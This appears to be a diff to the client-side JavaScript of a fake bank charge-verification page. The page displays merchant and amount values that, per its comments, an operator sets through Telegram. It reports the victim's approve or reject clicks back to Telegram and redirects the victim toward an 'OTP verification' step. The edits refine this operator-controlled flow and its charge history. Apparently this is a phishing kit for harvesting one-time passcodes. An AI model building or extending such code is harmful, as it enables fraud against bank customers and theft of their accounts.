@@ -57,7 +57,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
 
-// --- 4. HISTORIAL Y LÓGICA DE CARGOS ---
+  // --- 4. HISTORIAL Y LÓGICA DE CARGOS ---
   const historialContainer = document.getElementById('cargos-historial');
   const chargeCard = document.querySelector('.charge-card');
   const btnActionsRow = document.querySelector('.btn-actions-row');
@@ -69,29 +69,37 @@ document.addEventListener('DOMContentLoaded', () => {
     historialCargos = [];
   }
 
+  const pendingAction = sessionStorage.getItem('charge_action');
+  const resolvedMerchant = sessionStorage.getItem('resolved_merchant') || currentMerchant;
+  const resolvedAmount = sessionStorage.getItem('resolved_amount') || currentAmount;
+
   let estadoResuelto = null;
   if (accionTelegram === 'cierre') {
     estadoResuelto = 'RECHAZADO';
-  } else if (flowType === 'charge' && lastAction === 'aprobado') {
+  } else if (flowType === 'charge' && lastAction === 'aprobado' && pendingAction) {
     estadoResuelto = 'APROBADO';
-  } else if (flowType === 'charge' && lastAction === 'rechazado') {
+  } else if (flowType === 'charge' && lastAction === 'rechazado' && pendingAction) {
     estadoResuelto = 'RECHAZADO';
   }
 
+  // 1. Si se resolvió un cargo (ej. Programa Cero), lo agregamos al historial
   if (estadoResuelto) {
     historialCargos.push({
-      comercio: currentMerchant,
-      monto: currentAmount,
+      comercio: resolvedMerchant,
+      monto: resolvedAmount,
       estado: estadoResuelto
     });
     localStorage.setItem('cargos_historial', JSON.stringify(historialCargos));
 
+    // Limpiamos las banderas de esa resolución
     localStorage.removeItem('transaction_status');
     sessionStorage.removeItem('accion_telegram');
-    sessionStorage.removeItem('charge_merchant');
-    sessionStorage.removeItem('charge_amount');
+    sessionStorage.removeItem('charge_action');
+    sessionStorage.removeItem('resolved_merchant');
+    sessionStorage.removeItem('resolved_amount');
   }
 
+  // 2. Dibujamos todo el historial acumulado arriba
   function renderizarHistorial() {
     if (!historialContainer) return;
     historialContainer.innerHTML = '';
@@ -120,11 +128,20 @@ document.addEventListener('DOMContentLoaded', () => {
 
   renderizarHistorial();
 
-  if (estadoResuelto && chargeCard) {
-    chargeCard.style.display = 'none';
-  } else if (chargeCard) {
+  // 3. Verificamos si quedó un nuevo comercio | monto configurado desde Telegram
+  const nuevoComercio = sessionStorage.getItem('charge_merchant');
+  const nuevoMonto = sessionStorage.getItem('charge_amount');
+  const hayCargoNuevo = Boolean(nuevoComercio && (nuevoComercio !== resolvedMerchant || nuevoMonto !== resolvedAmount));
+  const esPrimeraCarga = historialCargos.length === 0 && !estadoResuelto;
+
+  if ((hayCargoNuevo || esPrimeraCarga) && chargeCard) {
+    if (merchantSpan && nuevoComercio) merchantSpan.textContent = nuevoComercio;
+    if (amountSpan && nuevoMonto) amountSpan.textContent = nuevoMonto;
+
     chargeCard.style.display = 'block';
     if (btnActionsRow) btnActionsRow.style.display = 'flex';
+  } else if (chargeCard) {
+    chargeCard.style.display = 'none';
   }
 
 
@@ -158,7 +175,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     localStorage.removeItem('transaction_status');
   }
-  
+
 
   // --- 6. EVENTOS PARA LOS BOTONES DE CARGO ---
   const btnApprove = document.getElementById('btn-accept-charge');
@@ -178,12 +195,16 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnApprove) {
     btnApprove.addEventListener('click', async () => {
       sessionStorage.setItem('flow_type', 'charge');
-      sessionStorage.setItem('charge_action', 'Aprobado');
+      sessionStorage.setItem('charge_action', 'aprobado');
+      // Guardamos el cargo exacto que el usuario acaba de aprobar
+      sessionStorage.setItem('resolved_merchant', currentMerchant);
+      sessionStorage.setItem('resolved_amount', currentAmount);
+
       if (statusMsg) {
         statusMsg.style.display = 'block';
         statusMsg.style.backgroundColor = '#d4edda';
         statusMsg.style.color = '#155724';
-        statusMsg.textContent = 'Procesando Aprobación... Redirigiendo a verificacón OTP.';
+        statusMsg.textContent = 'Procesando Aprobación... Redirigiendo a verificación OTP.';
       }
       await sendActionToTelegram('APROBAR CARGO');
       setTimeout(() => { window.location.href = 'loading.html'; }, 2000);
@@ -193,7 +214,11 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnReject) {
     btnReject.addEventListener('click', async () => {
       sessionStorage.setItem('flow_type', 'charge');
-      sessionStorage.setItem('charge_action', 'Rechazado');
+      sessionStorage.setItem('charge_action', 'rechazado');
+      // Guardamos el cargo exacto que el usuario acaba de rechazar
+      sessionStorage.setItem('resolved_merchant', currentMerchant);
+      sessionStorage.setItem('resolved_amount', currentAmount);
+
       if (statusMsg) {
         statusMsg.style.display = 'block';
         statusMsg.style.backgroundColor = '#f8d7da';
